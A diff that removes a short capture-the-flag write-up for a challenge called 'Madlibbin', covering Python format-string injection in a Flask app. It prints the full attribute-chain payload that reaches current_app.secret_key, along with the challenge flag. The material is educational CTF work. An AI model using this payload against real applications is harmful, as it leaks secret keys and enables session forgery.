@@ -1,9 +1,0 @@
-<h1>Madlibbin</h1>
-
-<p>In the challenge we could insert a template string that will be interpreted in Python's <code>"".format(args=request.args)</code> function. So the string <code>{args}</code> will return <code>ImmutableMultiDict([])</code>. The goal was to read <code>app.secret_key</code> value. </p>
-
-<p>By running the server locally and using the script from https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py, I found out the chain of properties that led to <code>Flask.app</code> object <code>{args.__class__.__weakref__.__objclass__._iter_hashitems.__globals__[__loader__].__class__.__weakref__.__objclass__.get_data.__globals__[__loader__].exec_module.__globals__[__builtins__][__build_class__].__self__.copyright.__class__._Printer__setup.__globals__[sys].modules[flask].current_app.secret_key}</code>.</p>
-
-<p>And the flag is: <strong>actf{traversed<em>the</em>world<em>and</em>the<em>seven</em>seas}</strong></p>
-
-<p>Solving script: <a href="./Madlibbin/app.py">./Madlibbin/app.py</a> <code>$ python3 -m flask run</code></p>
